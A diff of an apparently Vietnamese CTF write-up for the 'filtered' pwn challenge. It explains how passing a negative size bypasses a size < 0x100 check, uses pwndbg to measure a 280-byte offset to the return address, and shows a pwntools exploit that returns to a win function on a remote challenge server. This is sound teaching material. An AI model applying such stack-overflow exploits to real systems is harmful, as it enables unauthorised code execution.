@@ -2,7 +2,7 @@
 
 ## filtered
 
-
+Tải chall về , giải nén ra chúng ta thấy được 1 file thực thi và 1 file source c như sau: 
 
 ```
 void win(void) {
@@ -62,11 +62,6 @@ int main() {
 
 ```
 
-
-
-
-
-
 ```
 pwndbg> disassemble main
 Dump of assembler code for function main:
@@ -99,10 +94,46 @@ pwndbg>
 
 
 ```
+Sau khi đọc đoạn code này thì chúng ta có thể thấy được flow của chương trình như sau : 
+
+	+ Khai báo size của buf để viết dữ liệu, có điều kiện ràng buộc như sau size < 0x100
+	+ Ghi dữ liệu từ rsp và không thể ghi quá size đã khai báo trước đó.
+
+==> Có 2 hướng khai thác tiềm năng như sau: 
+
+Format String
+```
+void print(const char *msg) {
+  write(1, msg, strlen(msg));
+}
+void readline(const char *msg, char *buf, size_t size) {
+  char c;
+  print(msg);
+  for (size_t i = 0; i < size; i++) {
+    if (read(0, &c, 1) <= 0) {
+      print("I/O Error\n");
+      exit(1);
+    } else if (c == '\n') {
+      buf[i] = '\0';
+      break;
+    } else {
+      buf[i] = c;
+    }
+  }
+}
+```
+Hàm này sử dụng print(msg) nếu như mình kiểm soát được biến msg thì có khả năng sử dụng format string, tuy nhiên msg đầu vào lại là 1 chuỗi cố định nên không thể khai thác.
+
+BuffOverflow : chúng ta có thể lợi dụng lỗ hổng này có để có thể ghi đè lên lên stack :33 cách này khả thi nhất. Nhưng lại bị giới hạn bới điều kiện size, chỉ cần bypass qua được thì sẽ có thể exploit
+
+
+------------------------------------------------------------------------------------
 
 
 
+Chúng ta bắt đầu debug như sau:
 
+Đầu tiên xác định vị trí lưu trữ địa chỉ sẽ ret về, nên đặt breakpoint ngay tại lênh ret.
 
 ```
 pwndbg> b*0x401386
@@ -116,13 +147,14 @@ Bye!
 Breakpoint 1, 0x0000000000401386 in main ()
 
 ```
-
+Khi breakpoint dừng tại ret chúng ta kiểm tra rsp sẽ có được giá trị của old rbp.
 ```
 pwndbg> x/x $rsp
 0x7fffffffde38:	0xf7a2d840
 
 ```
 
+Tiếp tục đặt breakpoint ở leave để xác định vị trí lưu trữ old rbp trong stack.
 ```
 pwndbg> b*0x0000000000401385
 Breakpoint 2 at 0x401385
@@ -164,35 +196,18 @@ pwndbg>
 
 
 ```
+Từ những dữ kiện trên chúng ta tính được từ rsp đến vị trí của old rbp phải ghi đè hết 280 bytes, tuy nhiên size max mà hàm cho phép lại là 256(0x100).
 
+Tuy nhiên điều kiện là size < 0x100 vậy có nghĩa là chúng ta có thể sử dụng số âm. Như vậy đã tìm ra cách bypass điều kiện này thì chúng ta đã có thể exploit như sau : 
+
+Tìm kiếm địa chỉ hàm win 
 ```
 pwndbg> p*win
 $1 = {<text variable, no debug info>} 0x4011d6 <win>
 
 
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Sau đó chúng ta có file exploit như sau:
 
 ```
 from pwn import *
@@ -213,8 +228,8 @@ def exploit():
 	io.sendline(payload)
 	io.interactive()
 
-io = process(BIN)
-#io = remote("167.99.78.201", 9001)
+#io = process(BIN)
+io = remote("167.99.78.201", 9001)
 # context.log_level = "debug"
 exploit()
 
